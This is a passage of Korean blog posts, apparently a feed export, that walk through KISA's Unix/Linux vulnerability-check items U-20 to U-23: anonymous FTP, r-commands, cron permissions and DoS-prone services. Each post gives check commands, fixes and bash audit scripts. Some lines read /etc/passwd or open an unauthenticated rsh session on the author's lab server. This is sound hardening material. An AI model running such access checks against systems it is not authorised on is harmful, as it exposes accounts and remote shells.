<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td>/etc/passwd 파일에 ftp 계정 존재 여부 확인<br /><code>#cat /etc/passwd | grep &quot;ftp&quot;</code></td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="FTP-계정-존재-여부-확인"><a href="#FTP-계정-존재-여부-확인" class="headerlink" title="FTP 계정 존재 여부 확인"></a>FTP 계정 존재 여부 확인</h2><br>

<blockquote>
<p># cat /etc/passwd | grep &quot;ftp&quot;</p>
</blockquote>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-20/grep.png">

<br>

<br>

<h2 id="Anonymous-FTP-접속-여부-확인"><a href="#Anonymous-FTP-접속-여부-확인" class="headerlink" title="Anonymous FTP 접속 여부 확인"></a>Anonymous FTP 접속 여부 확인</h2><br>

<blockquote>
<p># ftp 192.168.219.105</p>
</blockquote>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-20/ftp.png">

<br>

<p><code>Anonymous</code> 계정으로 접속이 되는 것을 볼 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>조치 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td>1) 일반 FTP - Anonymous FTP 접속 제한 설정 방법<br /><code>/etc/passwd</code> 파일에서 <code>ftp</code> 또는 <code>anonymous</code> 계정 삭제<br />SOLARIS, LINUX, HP-UX 설정 : <code>#userdel ftp</code><br />AIX 설정 : <code>#rmuser ftp</code><br /><br />2) ProFTP - Anonymous FTP 접속 제한 설정 방법<br /><code>conf/proftpd.conf</code> 파일의 <code>anonymous</code> 관련 설정 중 <code>User</code>, <code>Useralias</code> 항목 주석처리<br />(proftpd.conf 파일의 위치는 운영체제 종류별로 상이함)<br /><br />3) vsFTP - Anonymous FTP 접속 제한 설정 방법<br />vsFTP 설정파일 (<code>/etc/vsftpd/vsftpd.conf</code> 또는 <code>/etc/vsftpd.conf</code>)에서 <code>anonymous_enable=NO</code> 설정</td>
</tr>
</tbody></table>
<br>

<br>

<p><code>/etc/vsftpd/vsftpd.conf</code> 파일에서 <code>anonymous_enable=NO</code>로 설정해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-20/anonymous.png">

<br>

<br>

<p><code>Anonymous</code> 계정으로 로그인 실패하였습니다.<br><br></p>
<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-20/ftp_2.png">

<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">AnonymousResult=<span class="string">&quot;&quot;</span></span><br><span class="line">FtpResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">Anonymous=`cat /etc/vsftpd/vsftpd.conf | grep anonymous_enable`</span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$Anonymous</span>&quot;</span> == *yes* ]]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        AnonymousResult=설정안됨</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        AnonymousResult=설정됨</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">ftp=`cat /etc/passwd | grep <span class="string">&quot;ftp&quot;</span>`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$ftp</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        FtpResult=있음</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        FtpResult=없음</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e Anonymous FTP 접속 제한 여부: <span class="string">&quot;<span class="variable">$AnonymousResult</span>&quot;</span> <span class="string">&quot;\n&quot;</span>FTP 계정 존재 여부: <span class="string">&quot;<span class="variable">$FtpResult</span>&quot;</span> | tee /root/result/u-20.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>/etc/vsftpd/vsftpd.conf</code> 파일에서 <code>anonymous_enable</code> 단어가 포함된 줄을 변수에 저장 후 <code>yes</code>라는 단어가 포함되어 있으면 <code>Anonymous FTP</code> 접속이 가능하고, 아니라면 불가능이라고 판단할 수 있게 코딩을 하였습니다.</p>
<p><code>/etc/passwd</code> 파일에서 <code>ftp</code>계정이 있는지 확인할 수 있도록 만들었습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-20</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-20/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-21 r계열 서비스 비활성화</title>
    <url>/2021/12/20/2021-12-20-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-21%20r%EA%B3%84%EC%97%B4%20%EC%84%9C%EB%B9%84%EC%8A%A4%20%EB%B9%84%ED%99%9C%EC%84%B1%ED%99%94/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>r-command 서비스 비활성화 여부 점검입니다.</p>
<p>항목코드는 <code>U-21</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<h2 id="r-command"><a href="#r-command" class="headerlink" title="r-command?"></a>r-command?</h2><br>

<p>인증 없이 관리자의 원격접속을 가능하게 하는 명령어들로 <code>rsh</code>, <code>rlogin</code>, <code>rexec</code>, <code>rsync</code> 등이 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>r-command 사용을 통한 원격 접속은 NET Backup 또는 클러스터링 등 용도로 사용되기도 하나, 인증 없이 관리자 원격접속이 가능하여 이에 대한 보안위협을 방지하고자 합니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p><code>rsh</code>, <code>rlogin</code>, <code>rexec</code> 등의 r-command를 이용하여 <u>원격에서 인증절차 없이</u> 터미널 접속, 쉘 명령어를 실행 가능합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>r-command 활성화된 서버</th>
<th>외부 서버 (비인가자)</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.105</td>
<td>192.168.219.104</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS 5.9<br />이하 버전</td>
<td>r-command 서비스 활성화 여부 확인<br /><code># vi /etc/inetd.conf</code></td>
</tr>
<tr>
<td>AIX</td>
<td><code># cat /etc/inetd.conf | grep rlogin</code> (# 처리 되어 있으면 비활성화)<br /><code># cat /etc/inetd.conf | grep rsh</code> (# 처리 되어 있으면 비활성화)</td>
</tr>
<tr>
<td>HP-UX</td>
<td><code># vi /etc/inetd.conf</code><br />r로 시작하는 필드 존재 시 취약</td>
</tr>
<tr>
<td>SOLARIS 5.10<br />이상 버전</td>
<td><code># inetadm | egrep &quot;shell|rlogin|rexec&quot;</code><br />r command 관련 데몬 확인</td>
</tr>
<tr>
<td>LINUX<br />(xinetd일 경우)</td>
<td>rsh, rlogin, rexec (shell, login, exec) 서비스 구동 확인<br /><code># ls -alL /etc/xinetd.d/* | egrep &quot;rsh|rlogin|rexec&quot; | egrep -v &quot;grep|klogin|kshell|kexec&quot;</code></td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="r-command-활성화-여부-확인"><a href="#r-command-활성화-여부-확인" class="headerlink" title="r-command 활성화 여부 확인"></a>r-command 활성화 여부 확인</h2><br>

<blockquote>
<p># ls -alL /etc/xinetd.d/* | egrep &quot;rsh|rlogin|rexec&quot; | egrep -v &quot;grep|klogin|kshell|kexec&quot;</p>
</blockquote>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-21/grep.png">

<br>

<br>

<h2 id="인증-없이-접속-여부-확인"><a href="#인증-없이-접속-여부-확인" class="headerlink" title="인증 없이 접속 여부 확인"></a>인증 없이 접속 여부 확인</h2><br>

<blockquote>
<p># rsh 192.168.219.105</p>
</blockquote>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-21/rsh.png">

<p><br>인증 없이 접속이 되는 것을 볼 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>조치 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS 5.9<br />이하 버전,<br />HP-UX</td>
<td>1) r 계열 서비스 활성화 여부 확인<br />    <code># vi /etc/inetd.conf</code><br /><br />2) r로 시작하는 필드 주석처리 후 재가동<br />    (수정 전)<br />    shell    stream    tcp    nowait    root    /usr/sbin/in.rshd    in.rshd<br /><br />    (수정 후)<br />    #shell    stream    tcp    nowait    root    /usr/sbin/in.rshd    in.rshd<br /><br />SOLARIS) <code># kill -HUP [inetd PID]</code><br />HP-UX) <code># inetd -c</code></td>
</tr>
<tr>
<td>AIX</td>
<td>1) r 계열 서비스 활성화 여부 확인<br />    <code># cat /etc/inetd.conf |grep rlogin</code> (# 처리 되어 있으면 비활성화)<br />    <code># cat /etc/inetd.conf |grep rsh</code> (# 처리 되어 있으면 비활성화)<br />    <code># cat /etc/inetd.conf |grep exec</code> (# 처리 되어 있으면 비활성화)<br /><br />2) <code>/etc/hosts.equiv</code> 파일은 TRUSTED 시스템을 등록<br /><br />3) <code>.rhosts</code> 파일은 사용자 별로 ‘r’command를 통해 접근이 가능하도록 설정할 수 있음($HOME/.rhosts)</td>
</tr>
<tr>
<td>SOLARIS 5.10<br />이상 버전</td>
<td>1) r’command 관련 데몬 확인<br />    <code>svc:/network/login:rlogin</code><br />    <code>svc:/network/rexec:default</code><br />    <code>svc:/network/shell:kshell</code><br /><br />2) inetadm -d “중지하고자 하는 데몬” 명령으로 데몬 중지<br />    <code># inetadm -d svc:/network/login:rlogin</code><br />    <code># inetadm -d svc:/network/rexec:default</code><br />    <code># inetadm -d svc:/network/shell:kshell</code></td>
</tr>
<tr>
<td>LINUX<br />(xinetd일 경우)</td>
<td>1) vi 편집기를 이용하여 <code>/etc/xinetd.d/</code> 디렉터리 내 <code>rlogin</code>, <code>rsh</code>, <code>rexec</code> 파일 열기<br /><br />2) 아래와 같이 설정 (Disable = yes 설정)<br />    <img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-21/vi.png"><br /><br />3) xinetd 서비스 재시작<br />    <code># service xinetd restart</code></td>
</tr>
<tr>
<td>r-command 사용시</td>
<td>1) r command 사용을 허용하는 호스트 및 계정 설정<br />    - <code>.rhosts</code>, <code>hosts.equiv</code> 파일에 접근을 허용하는 IP 명시 (공인 IP 설정은 금지)<br />    - <code>.rhosts</code>, <code>hosts.equiv</code> 파일의 퍼미션을 600 이하로 설정<br />    - 필요시 <code>TCP_Wrapper</code>를 이용하여 접근을 허용하는 IP를 등록하여 추가 보안 설정</td>
</tr>
</tbody></table>
<br>

<br>

<p><code>/etc/xinetd.d/rlogin</code> 파일에서 <code>disable=yes</code>로 설정해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-21/vi.png">

<br>

<br>

<p><code>rlogin</code> 접속 실패했습니다.<br><br></p>
<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-21/rsh_2.png">

<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line">RcommandResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`ls -al /etc/xinetd.d/* | egrep <span class="string">&quot;rsh|rlogin|rexec&quot;</span> | egrep -v <span class="string">&quot;grep|klogin|kshell|kexec&quot;</span>`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=활성화</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=비활성화</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">Rcommand=`cat /etc/xinetd.d/r* | grep <span class="built_in">disable</span>`</span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$Rcommand</span>&quot;</span> == *no* ]]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        RcommandResult=설정 안됨</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        RcommandResult=설정됨</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e R-Command 활성화 여부: <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> <span class="string">&quot;\n&quot;</span>Disable 설정: <span class="string">&quot;<span class="variable">$RcommandResult</span>&quot;</span> | tee /root/result/u-21.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>rsh, rlogin, rexec</code> 서비스가 활성화 상태인지 확인할 수 있도록 만들었습니다.</p>
<p><code>/etc/xinetd.d/r*</code> 파일에서 <code>disable</code> 단어가 포함된 줄을 변수에 저장 후 <code>no</code>라는 단어가 포함되어 있으면 해당 서비스가 비활성화 상태로 판단하고 아니면 활성 상태라고 판단할 수 있도록 만들었습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-21</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-21/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-22 crond 파일 소유자 및 권한 설정</title>
    <url>/2021/12/21/2021-12-21-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-22%20crond%20%ED%8C%8C%EC%9D%BC%20%EC%86%8C%EC%9C%A0%EC%9E%90%20%EB%B0%8F%20%EA%B6%8C%ED%95%9C%20%EC%84%A4%EC%A0%95/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>Cron 관련 파일의 권한 적절성 점검입니다.</p>
<p>항목코드는 <code>U-22</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<h2 id="Cron"><a href="#Cron" class="headerlink" title="Cron?"></a>Cron?</h2><br>

<p>특정 작업을 정해진 시간에 주기적으로 반복적으로 실행하기 위한 데몬 및 설정입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>관리자 외 cron 서비스를 사용할 수 없도록 설정하고 있는지 점검하는 것을 목적으로 합니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>root 외 일반 사용자에게도 crontab 명령어를 사용할 수 있도록 할 경우 고의 또는 실수로 불법적인 예약 파일 실행으로 시스템 피해를 일으킬 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>cron 활성화된 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.105</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td>Cron 관련 파일 권한 확인<br /><code># ls -al /usr/bin/crontab</code><br /><code>rw-r----- root &lt;cron 접근제어 파일&gt;</code></td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="일반-사용자-사용-가능-여부-확인"><a href="#일반-사용자-사용-가능-여부-확인" class="headerlink" title="일반 사용자 사용 가능 여부 확인"></a>일반 사용자 사용 가능 여부 확인</h2><br>

<blockquote>
<p># ls -al /usr/bin/crontab</p>
</blockquote>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-22/ls.png">

<br>

<p>일반 사용자도 사용이 가능하므로 취약합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<blockquote>
<p> <strong>공통설정</strong></p>
</blockquote>
<blockquote>
<ol>
<li><p>crontab 명령어 일반 사용자 권한 삭제 (crontab 명령어 위치는 OS별 다를 수 있음)</p>
<blockquote>
<p>crontab 명령어는 SUID가 설정되어 있으므로 SUID 설정 제거</p>
<p><code># ls -l /usr/bin/crontab</code></p>
<p><code># chmod 750 /usr/bin/crontab</code></p>
</blockquote>
</li>
</ol>
</blockquote>
<blockquote>
<ol start="2">
<li><p>cron 관련 설정파일 소유자 및 권한 설정</p>
<blockquote>
<p><code># chown root &lt;cron 관련 파일&gt;</code></p>
<p><code># chmod 640 &lt;cron 관련 파일&gt;</code></p>
<table>
<thead>
<tr>
<th>관련 설정파일</th>
<th>설명</th>
</tr>
</thead>
<tbody><tr>
<td><code>&lt;cron 디렉터리&gt;/crontab</code></td>
<td>예약 작업을 등록하는 파일</td>
</tr>
<tr>
<td><code>/etc/cron.hourly</code> <code>/etc/cron.daily</code><br /><code>/etc/cron.weekly</code> <code>/etc/cron.monthly</code></td>
<td>시간, 일, 주, 월 단위 실행 스크립트 등록</td>
</tr>
<tr>
<td><code>/var/spool/cron/</code> 또는 <code>/var/spool/cron/crontabs/</code></td>
<td>사용자 별 설정된 cron 작업 목록</td>
</tr>
<tr>
<td><code>cron.allow</code> <code>cron.deny</code></td>
<td>crontab 명령어 허용(차단) 사용자 등록</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>OS</th>
<th>관련 설정파일 위치</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS</td>
<td><code>/etc/cron.d/</code></td>
</tr>
<tr>
<td>LINUX</td>
<td><code>/etc/</code></td>
</tr>
<tr>
<td>AIX, HP-UX</td>
<td><code>/var/adm/cron/</code></td>
</tr>
</tbody></table>
</blockquote>
</li>
</ol>
</blockquote>
<br>

<br>

<blockquote>
<p><strong>crontab 명령어를 일반사용자에게 허용하는 경우</strong></p>
</blockquote>
<blockquote>
<ol>
<li><p><code>/etc/cron.d/cron.allow</code> 및 <code>/etc/cron.d/cron.deny</code> 파일의 소유자 및 권한 변경</p>
<blockquote>
<p><code># chown root /etc/cron.d/cron.allow</code></p>
<p><code># chmod 640 /etc/cron.d/cron.allow</code></p>
<p><code># chown root /etc/crond/cron.deny</code></p>
<p><code># chmod 640 /etc/cron.d/cron.deny</code></p>
</blockquote>
</li>
</ol>
</blockquote>
<blockquote>
<ol start="2">
<li><p><code>/etc/cron.d/cron.allow</code> 및 <code>/etc/cron.d/cron.deny</code> 파일에 사용자 등록</p>
<blockquote>
<p><code># cat /etc/cron.allow</code> (crontab 명령어 사용을 허용하는 사용자 등록)</p>
<p><code># cat /etc/cron.deny</code> (crontab 명령어 사용을 차단하는 사용자 등록)</p>
</blockquote>
</li>
</ol>
</blockquote>
<br>

<br>

<p><code>crontab</code> 명령어 일반사용자 권한을 삭제하였습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-22/cron.png">

<br>

<br>

<p>일반 사용자가 <code>crontab</code> 명령어 사용 시 권한이 없다고 나옵니다.<br><br></p>
<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-22/cron_2.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-23 DOS 공격에 취약한 서비스 비활성화</title>
    <url>/2021/12/21/2021-12-21-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-23%20DOS%20%EA%B3%B5%EA%B2%A9%EC%97%90%20%EC%B7%A8%EC%95%BD%ED%95%9C%20%EC%84%9C%EB%B9%84%EC%8A%A4%20%EB%B9%84%ED%99%9C%EC%84%B1%ED%99%94/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>사용하지 않는 DOS 공격에 취약한 서비스의 실행 여부 점검입니다.</p>
<p>항목코드는 <code>U-23</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<h2 id="DOS"><a href="#DOS" class="headerlink" title="DOS?"></a>DOS?</h2><br>

<p>Denial of Service attack의 약자로 시스템을 악의적으로 공격해 해당 시스템의 자원을 부족하게 하여 원래 의도 된 용도로 사용하지 못하게 하는 공격입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>시스템 보안성을 높이기 위해 취약점이 많이 발표된 <code>echo</code> <code>discard</code> <code>daytime</code> <code>chargen</code> <code>ntp</code> <code>snmp</code> 등의 서비스를 중지합니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>해당 서비스가 활성화되어 있는 경우 시스템 정보 유출 및 DoS의 대상이 될 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.105</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS</td>
<td><code># svcs -a | grep echo</code><br /><code># svcs -a |grep daytime</code><br /><code># svcs -a |grep discard</code><br /><code># svcs -a |grep chargen</code><br /><code>echo</code> <code>discard</code> <code>daytime</code> <code>chargen</code> 서비스 활성 여부 확인</td>
</tr>
<tr>
<td>AIX, HP-UX</td>
<td><code># vi /etc/inetd.conf</code><br /><code>echo</code> <code>discard</code> <code>daytime</code> <code>chargen</code> 필드 주석 처리 확인</td>
</tr>
<tr>
<td>SOLARIS 5.10<br />이상 버전</td>
<td><code># inetadm | grep enable | egrep &quot;echo|discard|daytime|chargen&quot;</code><br />명령으로 기타 서비스 데몬 확인</td>
</tr>
</tbody></table>
<br>

<br>

<table>
<thead>
<tr>
<th>서비스(포트)</th>
<th>설명</th>
</tr>
</thead>
<tbody><tr>
<td>echo(7)</td>
<td>클라이언트에서 보내는 메시지를 단순히 재전송</td>
</tr>
<tr>
<td>discard(9)</td>
<td>수신되는 임의 사용자의 데이터를 폐기하는 서비스</td>
</tr>
<tr>
<td>daytime(13)</td>
<td>daytime은 클라이언트의 질의에 응답하여 아스키 형태로<br />현재 시간과 날짜를 출력하는 데몬</td>
</tr>
<tr>
<td>chargen(19)</td>
<td>임의 길이의 문자열을 반환하는 서비스</td>
</tr>
<tr>
<td>NTP(123)</td>
<td>네트워크로 연결되어 있는 컴퓨터들끼리 클록 시각을<br />동기화시키는데 사용되는 서비스</td>
</tr>
<tr>
<td>DNS(53)</td>
<td>호스트의 도메인 이름을 호스트의 네트워크 주소로 바꾸거나<br />그 반대의 변환을 수행하는데 사용되는 서비스</td>
</tr>
<tr>
<td>SNMP(161/162)</td>
<td>네트워크 장비들로부터 필요한 정보를 가져와 장비 상태를<br />모니터링 하거나 설정값을 변경하는 등의 작업을 하여 네트워크<br />장비를 관리하는데 사용되는 서비스</td>
</tr>
<tr>
<td>SMTP(25)</td>
<td>인터넷에서 메일을 보내기 위해 사용되는 서비스</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="취약한-서비스-활성화-여부-확인"><a href="#취약한-서비스-활성화-여부-확인" class="headerlink" title="취약한 서비스 활성화 여부 확인"></a>취약한 서비스 활성화 여부 확인</h2><br>

<blockquote>
<p># netstat -ltup |grep echo</p>
</blockquote>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-23/grep.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>조치 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS</td>
<td><code>echo</code> <code>discard</code> <code>daytime</code> <code>chargen</code> 서비스 비활성화 설정<br /><code>예) # svcs -a | grep echo</code><br /><code># svcadm disable svc:/network/echo:dgrm</code><br /><code># svcadm disable svc:/network/echo:stream</code></td>
</tr>
<tr>
<td>AIX, HP-UX</td>
